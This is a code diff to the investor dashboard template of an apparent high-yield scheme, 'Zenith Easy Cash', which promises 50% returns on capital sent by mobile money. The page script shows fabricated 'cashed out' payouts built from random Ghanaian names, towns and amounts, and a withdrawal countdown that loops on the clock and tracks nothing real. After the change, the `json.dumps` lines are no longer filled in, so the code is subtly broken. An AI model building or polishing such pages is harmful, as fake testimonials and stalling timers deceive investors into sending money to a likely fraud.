@@ -519,7 +519,8 @@ INVESTOR_LOGIN_TEMPLATE = """
 </html>
 """
 
-INVESTOR_DASHBOARD_TEMPLATE = f"""
+# Fixed: Removed 'f' prefix from INVESTOR_DASHBOARD_TEMPLATE to prevent Jinja2 bracket evaluation conflicts
+INVESTOR_DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -527,31 +528,31 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Dashboard - Zenith Easy Cash</title>
     <style>
-        body {{ font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }}
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         
         /* WIDE SIDE-BY-SIDE LAYOUT */
-        .main-layout {{ max-width: 1150px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }}
-        .dashboard-container {{ flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }}
+        .main-layout { max-width: 1150px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
+        .dashboard-container { flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         
         /* SIDEBAR TICKER CARD LAYOUT CONTROLLED BY TOP CONFIG VARIABLES */
-        .sidebar-ticker {{ 
-            width: {{{{ zenith_sidebar_width }}}}; 
+        .sidebar-ticker { 
+            width: {{ zenith_sidebar_width }}; 
             flex-shrink: 0;
             background: #111827; 
             color: #ffffff; 
-            padding: {{{{ zenith_sidebar_padding }}}}; 
+            padding: {{ zenith_sidebar_padding }}; 
             border-radius: 8px; 
             position: sticky; 
             top: 20px; 
-            max-height: {{{{ zenith_sidebar_max_height }}}}; 
+            max-height: {{ zenith_sidebar_max_height }}; 
             overflow-y: auto;
             border: 1px solid #1f2937;
             box-shadow: 0 4px 15px rgba(0,0,0,0.25);
             box-sizing: border-box;
-        }}
+        }
 
         /* STICKY HEADER WITH GPS BLINKING TAG */
-        .sidebar-sticky-header {{
+        .sidebar-sticky-header {
             position: sticky;
             top: 0;
             background: #111827;
@@ -560,8 +561,8 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
             border-bottom: 1px solid #334155;
             margin-bottom: 12px;
             text-align: center;
-        }}
-        .gps-online-tag {{
+        }
+        .gps-online-tag {
             display: inline-flex;
             align-items: center;
             gap: 6px;
@@ -572,8 +573,8 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
             font-size: 11px;
             font-weight: bold;
             margin-bottom: 6px;
-        }}
-        .gps-dot {{
+        }
+        .gps-dot {
             width: 8px;
             height: 8px;
             background-color: #22c55e;
@@ -581,39 +582,39 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
             display: inline-block;
             box-shadow: 0 0 8px #22c55e;
             animation: gpsBlink 1.2s infinite ease-in-out;
-        }}
-        @keyframes gpsBlink {{
-            0% {{ transform: scale(0.9); opacity: 0.5; }}
-            50% {{ transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px #22c55e; }}
-            100% {{ transform: scale(0.9); opacity: 0.5; }}
-        }}
+        }
+        @keyframes gpsBlink {
+            0% { transform: scale(0.9); opacity: 0.5; }
+            50% { transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px #22c55e; }
+            100% { transform: scale(0.9); opacity: 0.5; }
+        }
         
-        h2 {{ color: #028a0f; margin-top: 0; }}
-        .logout {{ float: right; }}
-        .logout a {{ background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }}
-        .home-link-top {{ margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }}
-        .home-link-top a {{ color: #028a0f; text-decoration: none; font-weight: bold; }}
-        .profile-btn-link {{ background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }}
-        .card {{ background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }}
+        h2 { color: #028a0f; margin-top: 0; }
+        .logout { float: right; }
+        .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
+        .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+        .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-btn-link { background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
+        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
         
-        .balance-cards-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }}
-        .balance-card {{ background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }}
-        .balance-card.current {{ border-left: 4px solid #028a0f; background: #f0fdf4; }}
-        .balance-card.pending {{ border-left: 4px solid #d97706; background: #fffbeb; }}
-        .balance-card h4 {{ margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }}
-        .balance-card .amount {{ font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }}
+        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
+        .balance-card.current { border-left: 4px solid #028a0f; background: #f0fdf4; }
+        .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
+        .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
 
-        .btn-withdraw {{ background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }}
-        .btn-topup-toggle {{ background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }}
-        .topup-dropdown {{ background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }}
-        .loading-badge {{ display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }}
-        .spinner {{ width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }}
-        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        .countdown-live-box {{ background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }}
-        .flash {{ background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }}
+        .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
+        .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
+        .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
+        .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
+        .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
         
         /* SIDEBAR FEED ITEM STYLING WITH SMOOTH FADE OUT */
-        .side-ticker-item {{ 
+        .side-ticker-item { 
             background: #1e293b; 
             border: 1px solid #334155;
             border-left: 4px solid #22c55e; 
@@ -626,29 +627,29 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
             opacity: 0;
             transform: translateY(-10px);
             transition: all 0.4s ease-in-out;
-        }}
-        .side-ticker-item.show {{
+        }
+        .side-ticker-item.show {
             opacity: 1;
             transform: translateY(0);
-        }}
-        .side-ticker-item.fade-out {{
+        }
+        .side-ticker-item.fade-out {
             opacity: 0;
             transform: scale(0.95);
-        }}
-        .side-ticker-item .name-town {{ 
+        }
+        .side-ticker-item .name-town { 
             font-size: 13px; 
             font-weight: bold; 
             color: #facc15; 
             margin-bottom: 2px; 
-        }}
-        .side-ticker-item .payout-text {{ 
+        }
+        .side-ticker-item .payout-text { 
             font-size: 12px; 
             color: #cbd5e1; 
-        }}
-        .side-ticker-item .payout-text b {{ 
+        }
+        .side-ticker-item .payout-text b { 
             color: #4ade80; 
-        }}
-        .company-momo-display {{ background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }}
+        }
+        .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
     </style>
 </head>
 <body>
@@ -659,7 +660,7 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
                 <a href="{{ url_for('profile_page') }}" class="profile-btn-link">👤 My Profile Settings</a>
             </div>
             <div>
-                <h2>Welcome, {{{{ investor.name }}}}</h2>
+                <h2>Welcome, {{ investor.name }}</h2>
                 <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
                 <div style="clear: both;"></div>
             </div>
@@ -668,62 +669,62 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
             <div class="balance-cards-grid">
                 <div class="balance-card current">
                     <h4>Current Balance Available</h4>
-                    <p class="amount">GHs {{{{ "%.2f"|format(current_balance) }}}}</p>
+                    <p class="amount">GHs {{ "%.2f"|format(current_balance) }}</p>
                 </div>
                 <div class="balance-card pending">
                     <h4>Pending Balance Available</h4>
-                    <p class="amount">GHs {{{{ "%.2f"|format(pending_balance) }}}}</p>
+                    <p class="amount">GHs {{ "%.2f"|format(pending_balance) }}</p>
                 </div>
             </div>
 
-            {{% with messages = get_flashed_messages() %}}
-              {{% if messages %}}<div class="flash">{{{{ messages[0] }}}}</div>{{% endif %}}
-            {{% endwith %}}
+            {% with messages = get_flashed_messages() %}
+              {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
+            {% endwith %}
 
-            {{% if investments %}}
-                {{% for inv in investments %}}
+            {% if investments %}
+                {% for inv in investments %}
                 <div class="card">
-                    <p style="margin-top:0;"><strong>Investment Slot #{{{{ loop.index }}}}</strong></p>
-                    <p><strong>Capital Invested:</strong> GHs {{{{ "%.2f"|format(inv.amount) }}}} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{{{ "%.2f"|format(inv.expected_return) }}}})</span></p>
-                    <p><strong>Payment Proof / ID:</strong> {{{{ inv.transaction_id }}}}</p>
-                    <p><strong>Registered On:</strong> {{{{ inv.date_time }}}}</p>
-                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{{{ inv.maturity_date }}}}</span></p>
+                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong></p>
+                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
+                    <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
+                    <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
+                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
                     
                     <p><strong>Live Tracker:</strong>
-                        <div class="countdown-live-box" data-maturity="{{{{ inv.maturity_date }}}}" id="tracker_{{{{ loop.index0 }}}">
-                            {{% if inv.maturity_date == 'Pending Approval' %}}
+                        <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
+                            {% if inv.maturity_date == 'Pending Approval' %}
                                 ⏳ Timer will start counting once payment is verified by Admin.
-                            {{% else %}}
+                            {% else %}
                                 Calculating remaining time...
-                            {{% endif %}}
+                            {% endif %}
                         </div>
                     </p>
 
                     <p><strong>Status:</strong> 
-                        {{% if inv.status == 'Pending Admin Payment Confirmation' %}}
+                        {% if inv.status == 'Pending Admin Payment Confirmation' %}
                             <span style="color: #c2410c; font-weight: bold;">⏳ Pending Admin Approval</span>
-                        {{% elif inv.status == 'Payment Confirmed & Active' %}}
+                        {% elif inv.status == 'Payment Confirmed & Active' %}
                             <div class="loading-badge">
                                 <div class="spinner"></div> Active & Yielding 50% Profit...
                             </div>
-                        {{% elif inv.status == 'Withdrawal Requested' %}}
+                        {% elif inv.status == 'Withdrawal Requested' %}
                             <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested - 12hr Payout Countdown: 
-                                <span id="withdrawalTimer_{{{{ loop.index0 }}}}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
+                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
                             </span>
-                        {{% elif inv.status == 'Withdrawn Completed' %}}
+                        {% elif inv.status == 'Withdrawn Completed' %}
                             <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + Profit)</span>
-                        {{% else %}}
-                            <span style="color: #555; font-weight: bold;">{{{{ inv.status }}}}</span>
-                        {{% endif %}}
+                        {% else %}
+                            <span style="color: #555; font-weight: bold;">{{ inv.status }}</span>
+                        {% endif %}
                     </p>
                     
-                    {{% if inv.status == 'Payment Confirmed & Active' %}}
-                    <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{{{ loop.index0 }}}})">➕ Top-Up / Make Another Investment</button>
+                    {% if inv.status == 'Payment Confirmed & Active' %}
+                    <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{ loop.index0 }})">➕ Top-Up / Make Another Investment</button>
                     
-                    <form action="{{{{ url_for('topup', sub_idx=inv.sub_idx) }}}}" method="POST" class="topup-dropdown" id="topupBox_{{{{ loop.index0 }}}}" enctype="multipart/form-data">
+                    <form action="{{ url_for('topup', sub_idx=inv.sub_idx) }}" method="POST" class="topup-dropdown" id="topupBox_{{ loop.index0 }}" enctype="multipart/form-data">
                         <div class="company-momo-display">
                             <strong>COMPANY MOMO ACCOUNT:</strong><br>
-                            Number: <b>{{{{ settings.momo_number }}}}</b> | Name: <b>{{{{ settings.momo_name }}}}</b><br>
+                            Number: <b>{{ settings.momo_number }}</b> | Name: <b>{{ settings.momo_name }}</b><br>
                             <small>Send payment first before uploading proof below!</small>
                         </div>
                         <label style="font-size:12px;">Top-Up Amount (GHs):</label>
@@ -733,16 +734,16 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
                         <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px;">
                         <button type="submit" style="background:#2e7d32; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
                     </form>
-                    {{% endif %}}
+                    {% endif %}
 
-                    {{% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}}
-                        <a href="{{{{ url_for('withdraw', sub_idx=inv.sub_idx) }}}}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{{{ "%.2f"|format(inv.expected_return) }}}})</a>
-                    {{% endif %}}
+                    {% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}
+                        <a href="{{ url_for('withdraw', sub_idx=inv.sub_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ "%.2f"|format(inv.expected_return) }})</a>
+                    {% endif %}
                 </div>
-                {{% endfor %}}
-            {{% else %}}
+                {% endfor %}
+            {% else %}
                 <p style="text-align:center; color:#666;">No investment records found.</p>
-            {{% endif %}}
+            {% endif %}
         </div>
 
         <!-- SIDEBAR TICKER CARD -->
@@ -756,62 +757,62 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
     </div>
 
     <script>
-        const tickerIntervalMs = {{{{ zenith_ticker_interval_ms }}}};
-        const minMultiplier = {{{{ zenith_min_withdrawal_multiple }}}};
-        const maxMultiplier = {{{{ zenith_max_withdrawal_multiple }}}};
-        const maxVisibleItems = {{{{ zenith_max_visible_items }}}};
+        const tickerIntervalMs = {{ zenith_ticker_interval_ms }};
+        const minMultiplier = {{ zenith_min_withdrawal_multiple }};
+        const maxMultiplier = {{ zenith_max_withdrawal_multiple }};
+        const maxVisibleItems = {{ zenith_max_visible_items }};
 
-        function toggleTopup(idx) {{
+        function toggleTopup(idx) {
             const box = document.getElementById('topupBox_' + idx);
-            if (box) {{
+            if (box) {
                 box.style.display = box.style.display === 'block' ? 'none' : 'block';
-            }}
-        }}
+            }
+        }
 
-        function updateTrackers() {{
-            document.querySelectorAll('.countdown-live-box').forEach(el => {{
+        function updateTrackers() {
+            document.querySelectorAll('.countdown-live-box').forEach(el => {
                 const targetStr = el.getAttribute('data-maturity');
-                if (!targetStr || targetStr === 'Pending Approval') {{
+                if (!targetStr || targetStr === 'Pending Approval') {
                     return;
-                }}
+                }
                 const targetDate = new Date(targetStr.replace(/-/g, "/"));
                 const now = new Date();
                 const diff = Math.floor((targetDate - now) / 1000);
 
-                if (diff > 0) {{
+                if (diff > 0) {
                     const days = Math.floor(diff / (3600 * 24));
                     const hrs = Math.floor((diff % (3600 * 24)) / 3600);
                     const mins = Math.floor((diff % 3600) / 60);
                     const secs = diff % 60;
-                    el.innerHTML = `⏳ Time Left: ${{days}}d ${{hrs}}h ${{mins}}m ${{secs}}s`;
-                }} else {{
+                    el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
+                } else {
                     el.innerHTML = `🎉 Maturity Reached! Ready for Withdrawal`;
                     el.style.color = "#4ade80";
-                }}
-            }});
-        }}
+                }
+            });
+        }
 
-        function updateWithdrawalCountdowns() {{
-            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {{
+        function updateWithdrawalCountdowns() {
+            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
                 let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
                 let hrs = Math.floor(secondsLeft / 3600);
                 let mins = Math.floor((secondsLeft % 3600) / 60);
                 let secs = secondsLeft % 60;
-                el.innerHTML = `${{hrs}}h ${{mins}}m ${{secs}}s`;
-            }});
-        }}
+                el.innerHTML = `${hrs}h ${mins}m ${secs}s`;
+            });
+        }
 
-        setInterval(() => {{
+        setInterval(() => {
             updateTrackers();
             updateWithdrawalCountdowns();
-        }}, 1000);
+        }, 1000);
         updateTrackers();
         updateWithdrawalCountdowns();
 
         const sideNames = {json.dumps(GHANA_NAMES_POOL)};
         const sideTowns = {json.dumps(GHANA_TOWNS_POOL)};
         
-        function addSideTickerItem() {{
+        function addSideTickerItem() {
             const list = document.getElementById('sideTickerList');
             if (!list) return;
             const name = sideNames[Math.floor(Math.random() * sideNames.length)];
@@ -822,22 +823,22 @@ INVESTOR_DASHBOARD_TEMPLATE = f"""
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
             item.innerHTML = `
-                <div class="name-town">${{name}}</div>
-                <div style="font-size:11px; color:#94a3b8; margin-bottom:2px;">(${{town}})</div>
-                <div class="payout-text">Cashed out <b>GHs ${{amt.toLocaleString()}}</b> via MoMo</div>
+                <div class="name-town">${name}</div>
+                <div style="font-size:11px; color:#94a3b8; margin-bottom:2px;">(${town})</div>
+                <div class="payout-text">Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo</div>
             `;
             list.prepend(item);
             
             // Trigger roll-in animation
-            setTimeout(() => {{ item.classList.add('show'); }}, 50);
+            setTimeout(() => { item.classList.add('show'); }, 50);
 
             // Manage maximum visible items with a fade-out effect
-            if (list.children.length > maxVisibleItems) {{
+            if (list.children.length > maxVisibleItems) {
                 const lastItem = list.lastElementChild;
                 lastItem.classList.add('fade-out');
-                setTimeout(() => {{ lastItem.remove(); }}, 400);
-            }}
-        }}
+                setTimeout(() => { lastItem.remove(); }, 400);
+            }
+        }
         setInterval(addSideTickerItem, tickerIntervalMs);
         addSideTickerItem();
         addSideTickerItem();
